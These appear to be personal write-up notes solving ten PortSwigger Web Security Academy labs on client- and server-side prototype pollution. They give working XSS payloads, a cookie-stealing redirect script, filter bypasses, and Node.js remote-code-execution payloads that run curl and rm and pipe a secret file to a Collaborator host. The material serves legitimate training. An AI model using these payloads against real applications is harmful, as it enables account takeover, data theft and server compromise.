### 1. Lab: DOM XSS via client-side prototype pollution
> This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
> 1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
> 2. Identify a gadget property that allows you to execute arbitrary JavaScript.
> 3. Combine these to call `alert()`.
You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.

##### Using DOM Invader
If we check the tab from developers console, we can see we have 2 sources, one is simply changing the property and another one is changing constructor.
![[Pasted image 20250224133555.png]]
Next we can do is scan for gadgets. When we scan for the gadget, it will open a new tab and so some scanning, and after scan if we go to console, we will see an exploit button.
![[Pasted image 20250224133707.png]]Just click on exploit and it will solve the lab with alert. Here's the final url: `https://0a9b006d046148cb81631b3c00600026.web-security-academy.net/?__proto__[transport_url]=data%3A%2Calert%281%29` But what did we learn from this? Just a tool. Let's understand this in more detail now.
##### Manually
If we search something and check the network tab, we will see two requests in particular with `js` files, that is, `searchLogger.js` and `deparam.js`.  In `seachLogger.js` there is this content.
```js
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```
This code is getting url parameters and then using `transport_url` and adding that as the script's source. Now, notice below screenshot carefully.
![[Pasted image 20250224134107.png]]
We have added `transport_url` in proto with the content of `abc` into it. It tries to fetch the request but it failed and if we look at the console, we will see it is getting populated. Now we have clear idea of what we have to do, let's make an alert.
> Solution: `?__proto__[transport_url]=data:,alert(1);`

### 2. Lab: DOM XSS via an alternative prototype pollution vector
> This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
>1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
>2. Identify a gadget property that allows you to execute arbitrary JavaScript.
>3. Combine these to call `alert()`.
You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.

The lab involves a search functionality where user input is processed by JavaScript. By analyzing the network requests, it was observed that the searchLoggerAlternative.js script handles the search query. The script uses `window.manager.sequence`, which is not initialized, making it susceptible to prototype pollution.
By manipulating the `sequence` property, it is possible to inject arbitrary properties into the global object. For example, sending a payload like `?__proto__[sequence]=ABC` pollutes the `sequence` property, allowing control over its value. The polluted `sequence` property is used in an arithmetic operation (`a + 1`), where `a` is the value of `manager.sequence`. By injecting a payload like `?__proto__[sequence]=alert(1)`, the `eval` function evaluates the payload, but this results in a syntax error due to improper concatenation. To ensure valid JavaScript syntax, arithmetic operations like `+` or `-` can be used. For instance, injecting `?__proto__[sequence]=alert(1)-1` ensures the payload is evaluated correctly. The `eval` function processes the payload, and the `alert(1)` is executed, solving the lab.
![[Pasted image 20250224152013.png]]

<iframe width="560" height="315" src="https://www.youtube.com/embed/DXeNwLR8IsM?si=lFSkkzGo8AOvscqj" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

> Solution: `/?__proto__.sequence=alert(1)-`
### 3. Lab: Client-side prototype pollution via flawed sanitization
> This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.
To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.

For this lab, we will start by looking at proto.
1. `/?__proto__[foo]=bar` ![[Pasted image 20250908164323.png]] It says undefined, that means we cannot be able to do prototype pollution, let's check source and 
2. Checking source ![[Pasted image 20250908164422.png]] We see that it is replacing `__proto__`, so we will use something like `__pro__proto__to__`.
3. New payload: `/?__pro__proto__to__[foo]=bar` ![[Pasted image 20250908164517.png]] We see that the value is getting updated.
4. Next if we check the source, we will see that src is getting populated with `transport_url`, so we will do alert on that.
5. Final Payload: `/?__pro__proto__to__[transport_url]=data:,alert(1);`
### 4. Lab: Client-side prototype pollution in third-party libraries
> This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution) as this will save you a considerable amount of time and effort.
To solve the lab:
1. Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.
2. Use the provided exploit server to deliver a payload to the victim that calls `alert(document.cookie)` in their browser.
This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).

To solve the lab, I first opened it in Burp’s built-in browser, enabled DOM Invader, and turned on the prototype pollution option. After reloading the page with DevTools open on the DOM Invader tab, I observed that DOM Invader detected two prototype pollution vectors via the `hash` property of the URL fragment. I then clicked **Scan for gadgets**, which opened a new tab where DOM Invader tested the source. Once the scan finished, I opened DevTools again in that tab and saw that DOM Invader had successfully reached the `setTimeout()` sink using the `hitCallback` gadget. Clicking **Exploit** generated a proof-of-concept payload that executed `alert(1)`, confirming exploitation.
With this confirmed, I disabled DOM Invader and moved to the exploit server. In the body of the exploit, I crafted a payload to redirect the victim to a malicious URL containing the prototype pollution payload:
```js
<script>
    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"
</script>
```
I tested this on myself to ensure it navigated me back to the lab’s homepage and triggered `alert(document.cookie)` as expected. Finally, I delivered the exploit to the victim through the exploit server, which successfully executed the payload and solved the lab.

### 5. Lab: Privilege escalation via server-side prototype pollution
> This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.
To solve the lab:
1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user `carlos`.
You can log in to your own account with the following credentials: `wiener:peter`

After we login, we can able to see there is `isAdmin` property that is returned from backend, which is `false` by default. If we add this payload `"__proto__":{ "foo":"bar" }` with request, we can able to change the value of admin in backend and with that we can able to access admin panel.
![[Pasted image 20250908171525.png]]
### 6. Lab: Detecting server-side prototype pollution without polluted property reflection
> This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
To solve the lab, confirm the vulnerability by polluting `Object.prototype` in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is designed to help you practice non-destructive detection techniques, you don't need to progress to exploitation.
You can log in to your own account with the following credentials: `wiener:peter`

To solve the lab, I started by logging in and submitting the form to update my billing and delivery address. In Burp’s **Proxy > HTTP history**, I found the `POST /my-account/change-address` request, which contained my address details in JSON format. I sent this request to Burp Repeater and confirmed that the server responded with a JSON object representing my user, updated with the new address.
Next, I tested for prototype pollution by adding a `__proto__` property to the request body: `"__proto__": {"foo": "bar"}`.
The response didn't reflect the injected property, but I knew that didn't rule out prototype pollution. To investigate further, I broke the JSON syntax by deleting a comma and resent the request. This triggered a **500 error response**, but the body included a JSON error object with a `status` property set to `400`.
With this clue, I fixed the JSON syntax and attempted to pollute the prototype by injecting my own `status` value within `__proto__`: `"status": 555`
![[Pasted image 20250908172952.png]]After sending the request, I received the normal user object response, suggesting the injection didn’t visibly affect the user data. To confirm pollution, I intentionally broke the JSON syntax again and resent the request. This time, the error response showed that both the `status` and `statusCode` properties matched my injected value of **555**, proving that I had successfully polluted the prototype. This confirmed the vulnerability, and the lab was solved. 
### 7. Lab: Bypassing flawed input filters for server-side prototype pollution
> This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
To solve the lab:
1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user `carlos`.
You can log in to your own account with the following credentials: `wiener:peter`

Instead of `__proto__` we will use `constructor`.
```json
"constructor": { "prototype": { "isAdmin":true } }
```
![[Pasted image 20250908173803.png]]
### 8. Lab: Remote code execution via server-side prototype pollution
> This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
Due to the configuration of the server, it's possible to pollute `Object.prototype` in such a way that you can inject arbitrary system commands that are subsequently executed on the server.
To solve the lab:
1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that deletes the file `/home/carlos/morale.txt`.
In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: `wiener:peter`

Check if there is prototype pollution.
![[Pasted image 20250908175649.png]]
Yes, there is, next we will test if we can get anything on burp collaborator.
```json
"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ] }
```
Once we will get requests on collaborator, we will simply use `rm` command in order to delete that file.
```json
"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }
```
### 9. Lab: Client-side prototype pollution via browser APIs
> This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.
To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.
You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.
To solve the lab, I started by loading it in Burp’s built-in browser and enabling **DOM Invader** along with the **prototype pollution option**. I then opened the DevTools panel, navigated to the **DOM Invader** tab, and reloaded the page. DOM Invader identified two prototype pollution vectors in the **search property** of the query string.
Next, I clicked **Scan for gadgets**, which opened a new tab where DOM Invader automatically scanned for exploitable gadgets using the identified source. Once the scan completed, I opened DevTools in that tab, went back to the **DOM Invader** tab, and confirmed that it had successfully reached the **script.src sink** via the **value gadget**.
![[Pasted image 20250908183649.png]]
### 10. Lab: Exfiltrating sensitive data via server-side prototype pollution
> This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
Due to the configuration of the server, it's possible to pollute `Object.prototype` in such a way that you can inject arbitrary system commands that are subsequently executed on the server.
To solve the lab:
1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that leaks the contents of Carlos's home directory (`/home/carlos`) to the public Burp Collaborator server.
4. Exfiltrate the contents of a secret file in this directory to the public Burp Collaborator server.
5. Submit the secret you obtain from the file using the button provided in the lab banner.
In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: `wiener:peter`

To solve the lab, I first logged into my account and submitted the form to update my billing and delivery address. In Burp’s **Proxy > HTTP history**, I located the `POST /my-account/change-address` request and sent it to Repeater. The server responded with my updated user object in JSON format, which confirmed how the application handled address data.
I then tested for prototype pollution by adding a `__proto__` property with a `json spaces` value. After sending the modified request, I viewed the response in the **Raw** tab and noticed that the JSON indentation had increased. This clearly showed that the prototype had been polluted successfully.
`"__proto__": { "json spaces":10 }`
Next, I explored the **admin panel** and observed a button for running maintenance jobs. Clicking it triggered background tasks that cleaned up the database and filesystem, which suggested that Node’s `child_process.execSync()` might be used. To exploit this, I polluted the prototype with malicious properties that modified the execution options, crafting a payload to make a `curl` request to my Burp Collaborator domain. When I sent this request and triggered the maintenance jobs again, they failed to run. Checking the **Collaborator tab** revealed several interactions, confirming that I had successfully achieved remote code execution.
`"__proto__": { "shell":"vim", "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n" }`
![[Pasted image 20250908183851.png]]
`"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"`
With this foothold, I turned to exfiltrating sensitive information. I modified my payload to list the contents of Carlos’s home directory and send the results to Collaborator. After triggering the jobs once more, I received a POST request containing Base64-encoded data. Decoding this revealed two entries: `node_apps` and `secret`.

Finally, I adjusted the payload to read and exfiltrate the contents of the `/home/carlos/secret` file. After sending the request and triggering the maintenance jobs, Collaborator returned another POST request with Base64-encoded data. Decoding it provided me with the secret value. I copied this secret, submitted it in the lab banner, and successfully solved the challenge. ✅